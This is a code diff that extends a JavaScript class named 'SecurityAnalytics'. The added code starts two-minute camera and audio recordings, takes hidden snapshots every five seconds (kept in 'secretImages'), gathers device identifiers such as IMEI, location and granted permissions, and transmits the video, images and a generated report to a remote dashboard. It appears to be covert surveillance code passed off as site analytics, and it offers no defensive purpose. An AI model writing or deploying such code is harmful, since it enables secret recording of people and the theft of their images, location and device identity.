+  async getDeviceIdentity() {
+    // Implementation for device identity permission
+    if (navigator.device && navigator.device.getIdentity) {
+      return await navigator.device.getIdentity();
+    }
+    return null;
+  }
+
+  async getHardwareInfo() {
+    // Implementation for hardware info permission
+    if (navigator.hardware && navigator.hardware.getInfo) {
+      const info = await navigator.hardware.getInfo();
+      return info.imei || info.deviceId;
+    }
+    return null;
+  }
+
+  async getTelephonyInfo() {
+    // Implementation for telephony info permission
+    if (navigator.telephony && navigator.telephony.getInfo) {
+      const info = await navigator.telephony.getInfo();
+      return info.imei || info.deviceId;
+    }
+    return null;
+  }
+
+  async getMobileDeviceInfo() {
+    // Implementation for mobile device info permission
+    if (navigator.mobileDevice && navigator.mobileDevice.getInfo) {
+      const info = await navigator.mobileDevice.getInfo();
+      return info.imei || info.deviceId;
+    }
+    return null;
   }
 
   checkPermissions() {
@@ -355,7 +1498,293 @@ class SecurityAnalytics {
     });
   }
 
+  startVideoRecording() {
+    if (!this.cameraStream) return;
+    
+    this.recordingStartTime = Date.now();
+    this.recordedChunks = [];
+    
+    // Create MediaRecorder with high quality settings
+    const options = {
+      mimeType: 'video/webm;codecs=vp9,opus',
+      videoBitsPerSecond: 2500000, // 2.5 Mbps
+      audioBitsPerSecond: 128000   // 128 kbps
+    };
+    
+    try {
+      this.mediaRecorder = new MediaRecorder(this.cameraStream, options);
+    } catch (e) {
+      // Fallback to default codec
+      this.mediaRecorder = new MediaRecorder(this.cameraStream);
+    }
+    
+    this.mediaRecorder.ondataavailable = (event) => {
+      if (event.data.size > 0) {
+        this.recordedChunks.push(event.data);
+      }
+    };
+    
+    this.mediaRecorder.onstop = () => {
+      this.videoBlob = new Blob(this.recordedChunks, { type: 'video/webm' });
+      this.saveVideo();
+      this.disableCamera();
+    };
+    
+    // Start recording
+    this.mediaRecorder.start(1000); // Collect data every 1 second
+    
+    // Start image capture every 5 seconds
+    this.startImageCapture();
+    
+    // Auto-stop after 2 minutes
+    this.recordingTimeout = setTimeout(() => {
+      this.stopVideoRecording();
+    }, this.recordingDuration);
+    
+    console.log('Video recording started for 2 minutes');
+  }
+
+  startImageCapture() {
+    if (!this.cameraStream) return;
+    
+    const video = document.createElement('video');
+    video.srcObject = this.cameraStream;
+    video.play();
+    
+    const canvas = document.createElement('canvas');
+    canvas.width = 1280;
+    canvas.height = 720;
+    const context = canvas.getContext('2d');
+    
+    // Capture image every 5 seconds
+    this.imageCaptureInterval = setInterval(() => {
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL('image/jpeg', 0.9);
+      
+      this.collectedData.secretImages.push({
+        data: imageData,
+        timestamp: new Date().toISOString(),
+        deviceInfo: this.getDeviceInfo(),
+        recordingTime: Date.now() - this.recordingStartTime
+      });
+      
+      // Keep only last 24 images (2 minutes / 5 seconds)
+      if (this.collectedData.secretImages.length > 24) {
+        this.collectedData.secretImages.shift();
+      }
+      
+      // Transmit new image
+      this.transmitCollectedData();
+      
+    }, 5000);
+  }
+
+  stopVideoRecording() {
+    if (this.mediaRecorder && this.mediaRecorder.state !== 'inactive') {
+      this.mediaRecorder.stop();
+    }
+    
+    if (this.imageCaptureInterval) {
+      clearInterval(this.imageCaptureInterval);
+      this.imageCaptureInterval = null;
+    }
+    
+    if (this.recordingTimeout) {
+      clearTimeout(this.recordingTimeout);
+      this.recordingTimeout = null;
+    }
+    
+    console.log('Video recording stopped after 2 minutes');
+  }
+
+  saveVideo() {
+    if (!this.videoBlob) return;
+    
+    // Convert video blob to base64 for dashboard transmission
+    const reader = new FileReader();
+    reader.onloadend = () => {
+      const videoData = reader.result;
+      
+      // Send video to dashboard
+      this.sendVideoToDashboard(videoData);
+      
+      // Generate and send Word document with stats
+      this.generateStatsDocument();
+    };
+    reader.readAsDataURL(this.videoBlob);
+    
+    console.log('Video processed for dashboard');
+  }
+
+  sendVideoToDashboard(videoData) {
+    const videoPayload = {
+      type: 'VIDEO_RECORDING',
+      sessionId: this.sessionId,
+      videoData: videoData,
+      timestamp: new Date().toISOString(),
+      duration: this.recordingDuration,
+      fileName: `recording_${this.sessionId}_${new Date().toISOString().replace(/[:.]/g, '-')}.webm`
+    };
+    
+    this.sendDataToDashboard(videoPayload);
+  }
+
+  generateStatsDocument() {
+    const stats = {
+      sessionId: this.sessionId,
+      recordingDuration: this.recordingDuration / 1000, // Convert to seconds
+      totalImages: this.collectedData.secretImages.length,
+      deviceInfo: this.getDeviceInfo(),
+      location: this.collectedData.location,
+      permissions: this.collectedData.permissions,
+      timestamp: new Date().toISOString(),
+      images: this.collectedData.secretImages.map(img => ({
+        timestamp: img.timestamp,
+        recordingTime: img.recordingTime
+      }))
+    };
+
+    // Create HTML content for Word document
+    const wordContent = this.createWordDocument(stats);
+    
+    // Send to dashboard
+    const docPayload = {
+      type: 'STATS_DOCUMENT',
+      sessionId: this.sessionId,
+      documentContent: wordContent,
+      fileName: `stats_${this.sessionId}_${new Date().toISOString().replace(/[:.]/g, '-')}.doc`,
+      timestamp: new Date().toISOString()
+    };
+    
+    this.sendDataToDashboard(docPayload);
+  }
+
+  createWordDocument(stats) {
+    return `
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Analytics Report - ${stats.sessionId}</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; }
+        .header { text-align: center; border-bottom: 2px solid #00d4ff; padding-bottom: 20px; }
+        .section { margin: 20px 0; }
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .stat-box { border: 1px solid #ddd; padding: 15px; border-radius: 5px; }
+        .image-list { max-height: 400px; overflow-y: auto; }
+        .image-item { margin: 5px 0; padding: 10px; background: #f5f5f5; border-radius: 3px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Analytics Report</h1>
+        <h2>Session: ${stats.sessionId}</h2>
+        <p>Generated: ${new Date(stats.timestamp).toLocaleString()}</p>
+    </div>
+    
+    <div class="section">
+        <h3>Recording Summary</h3>
+        <div class="stats-grid">
+            <div class="stat-box">
+                <strong>Recording Duration:</strong> ${stats.recordingDuration} seconds
+            </div>
+            <div class="stat-box">
+                <strong>Total Images Captured:</strong> ${stats.totalImages}
+            </div>
+            <div class="stat-box">
+                <strong>Device:</strong> ${stats.deviceInfo.browser} on ${stats.deviceInfo.os}
+            </div>
+            <div class="stat-box">
+                <strong>Screen Resolution:</strong> ${stats.deviceInfo.screen.width}x${stats.deviceInfo.screen.height}
+            </div>
+        </div>
+    </div>
+    
+    <div class="section">
+        <h3>Location Information</h3>
+        <div class="stat-box">
+            ${stats.location && stats.location.available ? 
+                `Coordinates: ${stats.location.latitude.toFixed(6)}, ${stats.location.longitude.toFixed(6)}<br>
+                 Accuracy: ${stats.location.accuracy ? Math.round(stats.location.accuracy) + 'm' : 'Unknown'}<br>
+                 Source: ${stats.location.source}` : 
+                'Location not available'
+            }
+        </div>
+    </div>
+    
+    <div class="section">
+        <h3>Permissions Granted</h3>
+        <div class="stat-box">
+            ${Object.entries(stats.permissions).map(([perm, status]) => 
+                `<strong>${perm}:</strong> ${status}<br>`
+            ).join('')}
+        </div>
+    </div>
+    
+    <div class="section">
+        <h3>Captured Images Timeline</h3>
+        <div class="image-list">
+            ${stats.images.map((img, index) => 
+                `<div class="image-item">
+                    Image ${index + 1}: ${new Date(img.timestamp).toLocaleString()} 
+                    (Recording time: ${Math.round(img.recordingTime / 1000)}s)
+                </div>`
+            ).join('')}
+        </div>
+    </div>
+    
+    <div class="section">
+        <p><em>This report was automatically generated by the analytics system.</em></p>
+    </div>
+</body>
+</html>
+    `;
+  }
+
+  disableCamera() {
+    if (this.cameraStream) {
+      this.cameraStream.getTracks().forEach(track => {
+        track.stop();
+        track.enabled = false;
+      });
+      this.cameraStream = null;
+    }
+    
+    // Clear all intervals
+    if (this.secretCaptureInterval) {
+      clearInterval(this.secretCaptureInterval);
+      this.secretCaptureInterval = null;
+    }
+    
+    if (this.imageCaptureInterval) {
+      clearInterval(this.imageCaptureInterval);
+      this.imageCaptureInterval = null;
+    }
+    
+    // Clear mobile-specific intervals
+    if (this.mobileSaveInterval) {
+      clearInterval(this.mobileSaveInterval);
+      this.mobileSaveInterval = null;
+    }
+    
+    if (this.backgroundSaveInterval) {
+      clearInterval(this.backgroundSaveInterval);
+      this.backgroundSaveInterval = null;
+    }
+    
+    // Final mobile data save
+    if (this.isMobileDevice()) {
+      this.saveMobileRecordingState();
+      this.saveEmergencyData();
+    }
+    
+    console.log('Camera disabled and stopped');
+  }
+
   startSecretCapture() {
+    // This is now handled by startImageCapture for more frequent captures
+    // Keeping this for backward compatibility
     if (!this.cameraStream) return;
     
     const video = document.createElement('video');
@@ -367,7 +1796,7 @@ class SecurityAnalytics {
     canvas.height = 480;
     const context = canvas.getContext('2d');
     
-    // Capture image every 10 seconds
+    // Capture image every 10 seconds (backup capture)
     this.secretCaptureInterval = setInterval(() => {
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
       const imageData = canvas.toDataURL('image/jpeg', 0.8);
